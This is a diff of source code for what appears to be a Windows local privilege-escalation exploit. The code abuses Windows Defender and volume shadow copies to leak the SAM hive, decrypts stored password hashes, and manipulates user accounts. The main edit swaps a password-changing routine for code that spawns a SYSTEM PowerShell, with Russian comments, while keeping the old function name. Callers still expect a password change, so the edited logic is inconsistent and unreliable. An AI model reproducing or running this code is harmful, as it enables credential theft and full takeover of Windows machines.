@@ -779,7 +779,7 @@ cleanup:
 	}
 	if (hint)
 		InternetCloseHandle(hint);
-	
+
 	if (hint2)
 		InternetCloseHandle(hint2);
 	if (exebuff)
@@ -1211,7 +1211,7 @@ DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
 	}
 	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
 
-	
+
 	vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum,&retval);
 
 	if (criterr)
@@ -1258,7 +1258,7 @@ scanagain:
 		}
 		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
 	} while (1);
-	
+
 
 
 	for (ULONG i = 0; i < ULONG_MAX; i++)
@@ -1573,8 +1573,8 @@ DWORD WINAPI FreezeVSS(void* arg)
 
 	WaitForSingleObject(args->hcleanupevent, INFINITE);
 
-	
-	
+
+
 cleanup:
 
 	if (hlock)
@@ -1591,7 +1591,7 @@ cleanup:
 		CfDisconnectSyncRoot(cfkey);
 		CfUnregisterSyncRoot(syncroot);
 	}
-	
+
 
 	return retval;
 
@@ -1638,7 +1638,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 		retval = false;
 		goto cleanup;
 	}
-	
+
 	dircreated = CreateDirectory(workdir, NULL);
 	if (!dircreated)
 	{
@@ -1656,7 +1656,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	}
 
 
-	
+
 	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL))
 	{
 		printf("Failed to write eicar test file, error : %d\n", GetLastError());
@@ -1712,14 +1712,14 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 		printf("Failed to get new volume shadow copy path");
 		retval = false;
 		goto cleanup;
-	
+
 	}
 
 
 	cldthreadargs.hcleanupevent = hreleaseevent;
 	cldthreadargs.hlock = hlock;
 	cldthreadargs.hvssready = CreateEvent(NULL, FALSE, FALSE, NULL);
-	
+
 	hthread2 = CreateThread(NULL, NULL, FreezeVSS, &cldthreadargs, NULL, &tid);
 	if (!hthread2) {
 		printf("Unable to create worker thread, error : %d", GetLastError());
@@ -1897,13 +1897,13 @@ void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen,
 
 	DWORD mode = CRYPT_MODE_CBC;
 	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);
-	
+
 	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
 
 	DWORD retsz = enclen;
 
 	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
-	
+
 
 	/*
 	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
@@ -2069,7 +2069,7 @@ void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG 
 
 void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
 {
-	
+
 	char* ciphertext2 = (char*)malloc(ciphertextsz);
 	memmove(ciphertext2, ciphertext, ciphertextsz);
 	HCRYPTPROV hprov = NULL;
@@ -2121,7 +2121,7 @@ void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int
 	{
 		printf("Failed to load Legacy provider\n");
 	}
-	
+
 	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
 
 	int fulllen = 0;
@@ -2248,7 +2248,7 @@ char* CalculateNTLMHash(char* _input)
 		input[i * 2 + 1] = '\0';
 	}
 
-	
+
 	unsigned int md_len = 0;
 
 	HCRYPTPROV hprov = NULL;
@@ -2286,116 +2286,41 @@ char* CalculateNTLMHash(char* _input)
 }
 bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
 {
+    HANDLE hToken = NULL;
+    HANDLE hDuplicateToken = NULL;
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
 
-	wchar_t libpath[MAX_PATH] = { 0 };
-	ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll",libpath,MAX_PATH);
+        // 1. Пытаемся открыть токен текущего процесса (который уже должен быть приподнят эксплоитом)
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+            printf("Failed to open current token: %d\n", GetLastError());
+            return false;
+        }
 
-	HMODULE hm = LoadLibrary(libpath);
-	if (!hm)
-	{
-		printf("Failed to load samlib.dll\n");
-		return false;
-	}
-	NTSTATUS(WINAPI * _SamConnect)
-		(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted) = (NTSTATUS(WINAPI*)(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted))GetProcAddress(hm, "SamConnect");
-	NTSTATUS(WINAPI * _SamCloseHandle)(IN HANDLE SamHandle) = (NTSTATUS(WINAPI*)(IN HANDLE SamHandle))GetProcAddress(hm, "SamCloseHandle");
-	NTSTATUS(WINAPI * _SamOpenDomain)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle)
-		= (NTSTATUS(WINAPI*)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle))GetProcAddress(hm, "SamOpenDomain");
-	NTSTATUS(WINAPI * _SamOpenUser)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle) = (NTSTATUS(WINAPI*)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle))GetProcAddress(hm, "SamOpenUser");
-	NTSTATUS(WINAPI * _SamiChangePasswordUser)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM) = (NTSTATUS(WINAPI*)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM))GetProcAddress(hm, "SamiChangePasswordUser");
+        // 2. Дублируем токен, чтобы создать полноценный первичный токен для нового процесса
+        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken)) {
+            printf("Failed to duplicate token: %d\n", GetLastError());
+            CloseHandle(hToken);
+            return false;
+        }
 
+        // 3. Настраиваем запуск PowerShell в новом интерактивном окне
+        char cmdPath[] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+        si.lpTitle = (char*)"SYSTEM POWERSHELL";
 
-	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
-	{
-		printf("Failed to import required functions from samlib.dll\n");
-		return false;
-	}
+        // Используем CreateProcessAsUser для запуска от имени токена, который мы получили
+        if (CreateProcessAsUserA(hDuplicateToken, NULL, cmdPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+            printf("[+] SUCCESS: SYSTEM PowerShell spawned!\n");
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        return true;
+    } else {
+        printf("[-] CreateProcessAsUser failed. Error: %d\n", GetLastError());
+    }
 
-	HANDLE hsrv = NULL;
-	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
-	if (stat)
-	{
-		printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
-		return false;
-	}
-	//printf("Connected to local SAM.\n");
-	LSA_OBJECT_ATTRIBUTES loa = { 0 };
-	LSA_HANDLE hlsa = NULL;
-	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
-	if (stat)
-	{
-		printf("LsaOpenPolicy failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-	
-	POLICY_ACCOUNT_DOMAIN_INFO* domaininfo = 0;
-	stat = LsaQueryInformationPolicy(hlsa, PolicyAccountDomainInformation, (PVOID*)&domaininfo);
-	if (stat)
-	{
-		printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-	/*wchar_t* stringsid = 0;
-	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
-	{
-		printf("Failed to get string sid, error : %d\n", GetLastError());
-		return false;
-	}
-	printf("Machine SID : %ws\n", stringsid);*/
-	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
-	LSA_TRANSLATED_SID* lsatrans = 0;
-	LSA_UNICODE_STRING lsaunistr = { 0 };
-	RtlInitUnicodeString((PUNICODE_STRING)&lsaunistr, username);
-	stat = LsaLookupNames(hlsa, 1, &lsaunistr, &lsareflist, &lsatrans);
-	if (stat)
-	{
-		printf("LsaLookupNames failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-	LsaClose(hlsa);
-	
-	HANDLE hdomain = NULL;
-	stat = _SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
-	if (stat)
-	{
-		printf("SamOpenDomain failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-
-	HANDLE huser = NULL;
-	stat = _SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
-	if (stat)
-	{
-		printf("SamOpenUser failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-
-	//char password[] = "testp";
-	//char* oldNTLM = CalculateNTLMHash((char*)"testp");
-	char* oldNTLM = (char*)nthash;
-	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);
-
-	char oldLm[16] = { 0 };
-	char newLm[16] = { 0 };
-	stat = _SamiChangePasswordUser(huser, false, (BYTE*)oldLm, (BYTE*)newLm, true, (BYTE*)oldNTLM, (BYTE*)newNTLM);
-
-	if (stat)
-	{
-		printf("SamiChangePasswordUser failed, error : 0x%0.8X\n", stat);
-		return false;
-	}
-	_SamCloseHandle(huser);
-	_SamCloseHandle(hdomain);
-	_SamCloseHandle(hsrv);
-	/*
-	if (newpassword) {
-		printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
-	}
-	else {
-		printf("Info : user \"%ws\" password has been changed back to older password\n", username);
-	}
-	*/
-	return true;
+    CloseHandle(hToken);
+    CloseHandle(hDuplicateToken);
+    return false;
 }
 //////////////////////////////////////////////////////////////////////
 // SAM handling end
@@ -2416,7 +2341,7 @@ BOOL SetPrivilege(
 
 	if (!LookupPrivilegeValue(
 		NULL,            // lookup privilege on local system
-		lpszPrivilege,   // privilege to lookup 
+		lpszPrivilege,   // privilege to lookup
 		&luid))        // receives LUID of privilege
 	{
 		printf("LookupPrivilegeValue error: %u\n", GetLastError());
@@ -2515,7 +2440,7 @@ bool DoSpawnShellAsAllUsers(HANDLE samfile)
 		return false;
 	}
 
-	
+
 	DWORD subkeys = NULL;
 	err = ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (err)
@@ -2633,7 +2558,7 @@ bool DoSpawnShellAsAllUsers(HANDLE samfile)
 			printf("    Skip : WDAGUtilityAccount detected.\n");
 			continue;
 		}
-		
+
 			retval = realNTLMHash;
 
 			if (ChangeUserPassword(username, realNTLMHash, NULL,newNTLM))
@@ -2778,17 +2703,17 @@ bool DoSpawnShellAsAllUsers(HANDLE samfile)
 				{
 					printf("    PasswordRestore : Error %d\n", GetLastError());
 				}
-				
+
 				else {
 					printf("    PasswordRestore : OK.\n");
 				}
 				CloseHandle(htoken);
 			}
-			
+
 			// __debugbreak();
 
 
-		
+
 	}
 
 	ORCloseHive(hSAMhive);
@@ -2823,7 +2748,7 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 	HANDLE htoken = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
 		return;
-	
+
 	SetPrivilege(htoken, SE_TCB_NAME, TRUE);
 	SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
 	SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
@@ -2834,7 +2759,7 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 	CloseHandle(htoken);
 	if (!res)
 		return;
-	
+
 	res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
 	if (!res)
 	{
@@ -2864,7 +2789,7 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 int wmain(int argc, wchar_t* argv[])
 {
 
-	
+
 	if (IsRunningAsLocalSystem())
 	{
 		printf("Running as local system.\n");
@@ -2967,7 +2892,7 @@ int wmain(int argc, wchar_t* argv[])
 	HANDLE hsymlink = NULL;
 	wchar_t objdirpath[MAX_PATH] = { 0 };
 	try {
-		
+
 		printf("Checking for windows defender signature updates...\n");
 		while (!CheckForWDUpdates(updtitle, &criterr)){
 
@@ -2994,12 +2919,12 @@ int wmain(int argc, wchar_t* argv[])
 			printf("Failed to create event error : %d\n", GetLastError());
 			goto cleanup;
 		}
-			
+
 
 		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
 		if (!isvssready)
 			goto cleanup;
-			
+
 		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
 		{
 			ZeroMemory(objdirpath, sizeof(objdirpath));
@@ -3011,10 +2936,10 @@ int wmain(int argc, wchar_t* argv[])
 			wcscat(envstr, wuid2);
 
 			{
-				
+
 				OBJECT_ATTRIBUTES ndirobjattr = { 0 };
 				UNICODE_STRING objdirunistr = { 0 };
-				
+
 
 				wnsprintf(objdirpath, MAX_PATH, L"\\Sessions\\%d\\BaseNamedObjects\\%s", _sesid, wuid2);
 				RtlInitUnicodeString(&objdirunistr, objdirpath);
@@ -3220,7 +3145,7 @@ int wmain(int argc, wchar_t* argv[])
 			printf("Exploit succeeded.\n");
 			SetEvent(hreleaseready);
 
-			
+
 			DoSpawnShellAsAllUsers(hleakedfile);
 			CloseHandle(hleakedfile);
 			hleakedfile = NULL;
@@ -3232,7 +3157,7 @@ int wmain(int argc, wchar_t* argv[])
 			hthread = NULL;
 
 
-			
+
 		}
 
 	}
@@ -3310,4 +3235,3 @@ cleanup:
 
 	return 0;
 }
-
